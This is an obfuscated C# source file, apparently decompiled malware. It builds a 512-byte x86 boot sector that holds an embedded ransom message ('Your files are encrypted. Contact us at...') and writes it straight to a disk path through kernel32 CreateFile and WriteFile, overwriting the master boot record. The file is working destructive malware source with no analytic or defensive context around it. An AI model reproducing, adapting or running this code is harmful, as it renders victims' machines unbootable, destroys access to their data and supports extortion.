using System;
using System.Runtime.InteropServices;

namespace MufMaOSvGyvz;

internal class ILwfcQVhzflf
{
	private static uint SWgxMUTrCncDH = 0u;

	[DllImport("kernel32")]
	private static extern IntPtr CreateFile(string string_0, uint uint_0, uint uint_1, IntPtr intptr_0, uint uint_2, uint uint_3, IntPtr intptr_1);

	[DllImport("kernel32")]
	private static extern bool WriteFile(IntPtr SCpQDcvYnNv, byte[] sBhLjxzaeixG, uint GfNmiVYzAZ, out uint dfCgXxpQBkIE, IntPtr bFPCGmHSUuxAhFi);

	public static void hvKwMSNYgA(string string_0)
	{
		byte[] array = new byte[512]
		{
			144, 250, 51, 192, 142, 216, 188, 255, 255, 131,
			46, 19, 4, 1, 161, 19, 4, 251, 193, 224,
			6, 252, 142, 192, 51, 255, 190, 0, 124, 185,
			0, 2, 243, 164, 6, 104, 39, 0, 203, 51,
			192, 142, 192, 140, 194, 187, 0, 124, 180, 2,
			176, 1, 185, 4, 0, 186, 128, 0, 205, 19,
			185, 0, 2, 176, 144, 139, 243, 38, 48, 4,
			70, 226, 250, 6, 83, 184, 3, 0, 205, 16,
			180, 14, 140, 203, 142, 219, 142, 195, 51, 219,
			190, 165, 0, 172, 132, 192, 116, 9, 144, 144,
			205, 16, 235, 245, 190, 145, 0, 51, 192, 205,
			22, 180, 14, 205, 16, 52, 144, 46, 58, 4,
			117, 209, 70, 46, 128, 60, 0, 116, 4, 144,
			144, 235, 230, 91, 7, 106, 0, 104, 0, 124,
			203, 0, 0, 0, 0, 161, 162, 163, 164, 189,
			161, 162, 163, 164, 189, 161, 162, 163, 164, 189,
			161, 162, 163, 164, 0, 89, 111, 117, 114, 32,
			102, 105, 108, 101, 115, 32, 97, 114, 101, 32,
			101, 110, 99, 114, 121, 112, 116, 101, 100, 46,
			32, 67, 111, 110, 116, 97, 99, 116, 32, 117,
			115, 32, 97, 116, 58, 32, 103, 101, 116, 45,
			109, 121, 45, 100, 97, 116, 97, 64, 112, 114,
			111, 116, 111, 110, 109, 97, 105, 108, 46, 99,
			111, 109, 46, 46, 46, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			85, 170
		};
		int num = 165;
		string text = IyUWqQZlcOSTLhq.jKGdMalhZeKXBCvc(IyUWqQZlcOSTLhq.wrCDlMOHoXr);
		foreach (char value in text)
		{
			array[num] = Convert.ToByte(value);
			num++;
		}
		array[num] = 0;
		IntPtr intPtr = CreateFile(string_0, 268435456u, 3u, IntPtr.Zero, 3u, 0u, IntPtr.Zero);
		if (!(intPtr == (IntPtr)(-1)) && !WriteFile(intPtr, array, 512u, out SWgxMUTrCncDH, IntPtr.Zero))
		{
		}
	}
}
